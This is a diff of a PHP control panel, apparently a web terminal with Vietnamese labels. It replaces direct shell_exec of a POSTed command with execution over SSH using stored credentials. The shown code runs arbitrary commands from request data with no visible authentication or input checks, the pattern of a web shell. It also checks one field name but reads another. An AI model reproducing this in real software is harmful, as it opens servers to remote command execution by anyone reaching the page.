@@ -277,8 +277,16 @@ $output .= "$GET_current_USER@$HostName:~$ >Lệnh Được Thực Hiện Thành
 //Command
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['commandd'])) {
 	$commandnd = @$_POST['commandnd'];
-	$output = "$GET_current_USER@$HostName:~ $ $commandnd\n\n";
-    $output .= shell_exec($commandnd);
+//	$output = "$GET_current_USER@$HostName:~ $ $commandnd\n\n";
+//   $output .= shell_exec($commandnd);
+$connection = ssh2_connect($serverIP, $SSH_Port);
+if (!$connection) {die($E_rror_HOST);}
+if (!ssh2_auth_password($connection, $SSH_TaiKhoan, $SSH_MatKhau)) {die($E_rror);}
+$stream = ssh2_exec($connection, $commandnd);
+stream_set_blocking($stream, true);
+$stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
+$output = "$GET_current_USER@$HostName:~ssh$: $commandnd\n";
+$output .=  stream_get_contents($stream_out);
 }
 
 ?>
